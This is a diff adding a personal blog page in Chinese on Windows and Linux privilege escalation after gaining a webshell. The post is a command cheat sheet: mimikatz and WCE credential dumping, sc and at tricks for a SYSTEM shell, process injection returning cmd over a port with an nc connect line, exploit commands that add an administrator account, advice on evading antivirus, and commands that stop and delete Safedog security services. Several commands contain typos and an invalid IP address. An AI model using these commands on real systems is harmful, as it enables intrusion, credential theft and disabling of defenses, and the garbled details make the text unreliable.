@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>提权 | z0ekball</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://z0ekball.github.io/favicon.ico?v=1649935555331">
+<link rel="stylesheet" href="https://z0ekball.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="提权前提：
+1.拥有普通用户权限
+2.拥有网站webshell
+3.存在提权漏洞
+信息收集
+命令行
+
+查看远程控制是否开启：
+reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Ter..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://z0ekball.github.io">
+        <img src="https://z0ekball.github.io/images/avatar.png?v=1649935555331" class="site-logo">
+        <h1 class="site-title">z0ekball</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      温故而知新
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://z0ekball.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">提权</h2>
+            <div class="post-date">2021-08-14</div>
+            
+              <div class="feature-container" style="background-image: url('https://z0ekball.github.io/post-images/ti-quan.png')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <p><code>提权前提</code>：</p>
+<p>1.拥有普通用户权限</p>
+<p>2.拥有网站webshell</p>
+<p>3.存在提权漏洞</p>
+<h3 id="信息收集">信息收集</h3>
+<h4 id="命令行">命令行</h4>
+<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/1649935140181.png" alt="" loading="lazy"></figure>
+<p>查看远程控制是否开启：</p>
+<pre><code class="language-php">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDebyTSConnections
+</code></pre>
+<p>查看portnumber开启的端口:</p>
+<pre><code class="language-php">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber
+</code></pre>
+<p>检索敏感文件：</p>
+<pre><code class="language-php">dir /b /s *.txt
+</code></pre>
+<p>收集可利用poc：多关注新漏洞和已知漏洞，收集脚本，方便利用</p>
+<h4 id="漏洞分析工具">漏洞分析工具</h4>
+<p><code>Windows_Exploit_Suggester</code>：通过下载微软公开漏洞库到本地“生成日期+mssb.xls”文件，然后根据操作系统版本，跟systeminfo生成的文件进行比对，从而发现系统是否存在未修复漏洞。</p>
+<pre><code class="language-php">//下载漏洞库
+windows-exploit-suggester.py –update
+//靶机生成系统信息文件
+systeminfo &gt; win10.txt
+//查看系统漏洞
+windows-exploit-suggester.py --database 2018-08-11-mssb.xls --systeminfo win10.txt
+</code></pre>
+<p><code>Linux_Exploit_Suggester</code>：根据操作系统版本号自动查找相应提权脚本的工具，如果不带任何参数运行该脚本的话，将执行uname -r返回的操作系统发行版本，或者手工输入-k参数查找指定版本号。</p>
+<pre><code class="language-php">//查看内核信息
+uname -a-
+//检测漏洞
+./Linux_Exploit_Suggester.pl
+//指定版本检测漏洞
+./Linux_Exploit_Suggester.pl -k 2.6.28
+</code></pre>
+<h4 id="获取密码工具">获取密码工具</h4>
+<p><code>minikatz</code>：抓取密码</p>
+<pre><code class="language-php">//提取权限
+privilege::debug   
+//抓取密码
+sekurlsa::logonpasswords   
+</code></pre>
+<p><code>WCE</code>：抓取密码</p>
+<pre><code class="language-php">//查看当前登录的用户及加密的密码
+wce-universal.exe -l
+//查看当前用户登录的详细信息
+wce-universal.exe -lv
+//删除一个指定会话的luid
+wce-universal.exe -d ID号
+//刷新会话信息
+wce-universal.exe -e(手动更新)
+//拼接会话信息,拼接会话信息可以隐藏用户身份和信息
+wce-universal.exe -i ID号 -s 用户信息
+//生成指定字符串的lmhash和ntlmhash
+wce-universal.exe -g 明文密码
+//查看明文信息
+wce-universal -w
+</code></pre>
+<h3 id="系统提权">系统提权</h3>
+<h4 id="提权工具">提权工具</h4>
+<p><code>at命令</code>：Windows XP中内置的命令</p>
+<pre><code class="language-php">at+时间+/interaction cmd
+</code></pre>
+<p><code>sc命令</code>：XP系统中功能强大的DOS命令</p>
+<pre><code class="language-php">//创建super进程
+sc Creat Super binPath=&quot;cmd /K start&quot; type=own type=interact
+//启动
+sc start Super
+</code></pre>
+<p><code>pin.jector.exe</code>：注入进程</p>
+<pre><code class="language-php">//查看可注入进程
+pin.jector.exe -l
+//注入pid为600进程，使用端口2345返回cmd
+pin.jector.exe -p 600 cmd 2345
+//监听注入的进程
+nc -nv 192.268.1.57 2345
+</code></pre>
+<h4 id="windows提权">Windows提权</h4>
+<p><code>提权准备</code>：</p>
+<p>使用 Windows-Exploit-Suggester获取目前系统中可能存在的漏洞，步骤如下。</p>
+<p>①	收集并编译相关POC。</p>
+<p>②	若操作系统中安装了杀毒软件及安全防护软件，则需要对提权 POC	进行免杀，否则直接 进行下一步。</p>
+<p>③	上传POC。</p>
+<p>④	由WebShell或者反弹WebShell来执行命令。</p>
+<p>⑤	搜索漏洞，根据关键字进行搜索</p>
+<pre><code class="language-php">例如MS10-061。
+    
+●	在百度浏览器中搜索“MS10-061	site：exploit-db.com”。
+●	访问packetstormsecurity网站进行搜索（https：//packetstormsecurity.com/search/？ q=MS16-016）。 
+●	安全焦点的BugTraq是一个出色的漏洞和Exploit数据源，可以通过CVE编号或者产品信息漏洞直接搜索，网址为http：//www.securityfocus.com/bid。
+</code></pre>
+<p><code>MSF搜索可利用poc</code>：</p>
+<p>（1）搜索POC 在Kali中打开MSF或者执行“/usr/bin/msfconsole”命令，在命令提示符下使用search ms+年份后两位</p>
+<pre><code class="language-php">//搜索2018年Windows下所有可用exploit
+search ms18
+</code></pre>
+<p>（2）查看相关漏洞情况</p>
+<p>可以通过微软官方网站查看漏洞所对应的版本</p>
+<p>利用方式 :“https：//technet.microsoft.com/library/security/漏洞号”</p>
+<pre><code class="language-php">例如查看 MS08-068的网页，打开方式为“https：//technet.microsoft.com/library/security/ms08-068”。
+如果显 示为“严重”，则表明可以被利用。
+</code></pre>
+<p><code>实施提权</code>：</p>
+<p>可以通过执行命令进行提权</p>
+<pre><code class="language-php">//直接执行木马
+poc.exe ma.exe
+//添加用户
+poc.exe &quot;net user antian365 lqaz2wsx /add&quot;
+poc.exe &quot;net user localgroup administrators antian365 /add&quot;
+//获取明文密码或者哈希值
+poc.exe &quot;wce32.exe&quot; -w
+poc.exe &quot;wce64.exe&quot; -w
+poc.exe &quot;wce32&quot;
+</code></pre>
+<p><code>停用安全狗</code>：</p>
+<p>停用安全狗的相关服务：</p>
+<pre><code class="language-php">net stop &quot;Safedog Guard Center&quot; /y
+net stop &quot;Safedog Update Center&quot; /y
+net stop &quot;SafeDogCloudHelper&quot; /y
+</code></pre>
+<p>删除SafeDogGuardCenter服务：</p>
+<pre><code class="language-php">sc stop &quot;SafeDogGuardCenter&quot;
+sC config &quot;SafeDogGuardCenter&quot; start= disabled
+sC delete &quot;SafeDogGuardCenter&quot;
+
+sC stop &quot;Sa feDogUpdateCenter&quot;
+sC config &quot;SafeDogUpdateCenter&quot; start= disabled
+sC delete &quot;SafeDogUpdateCenter&quot;
+
+sc stop &quot;SafeDogCloudHelper”
+sC config &quot;SafeDogCloudHelper&quot; start= disabled
+sC delete &quot;Sa feDogCloudHelper&quot;
+</code></pre>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://z0ekball.github.io/post/jian-dan-mu-ma/">
+                  <h3 class="post-title">
+                    简单木马
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
